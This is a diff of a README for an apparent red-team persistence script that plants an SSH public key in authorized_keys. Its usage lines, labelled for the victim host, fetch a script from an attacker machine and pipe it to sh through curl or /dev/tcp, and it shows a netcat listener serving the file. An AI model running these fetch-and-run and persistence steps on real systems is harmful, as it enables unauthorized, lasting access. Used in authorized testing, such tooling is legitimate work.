@@ -5,31 +5,33 @@ Definition...
 Available parts:
 - Modify SSH Keys
 
-## Quick Start
-
+## Usage
 
 ```bash
 # From github
-curl -L github....file..bblablal
+curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/persistence.sh
+./persistence.sh -h
 ```
-
-
-
-
 ```bash
 # Local network
-sudo python -m SimpleHTTPServer 80 #Host
-curl 10.10.10.10/linpeas.sh | sh #Victim
-# Without curl
-sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
-cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+sudo python -m SimpleHTTPServer 8000 #Host
+curl <Host>:8000/persistence.sh | sh #Victim
 ```
 
+### Parameters
+```bash
+./persistence.sh -h
+
+Usage: ./persistence.sh [-h] [-s]
+
+-s <SSH public key>
+  Trying to add ssh public key to authorized_keys
+```
 
 ## Results
 
-Results stored to output/ directory.
+Results are output directly to the STDOUT.
 
 ## Compatibility
 
-The script is fully POSIX compatible and can run on most unix-based (POSIX/Unix/Linux) systems. 
+The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems. 
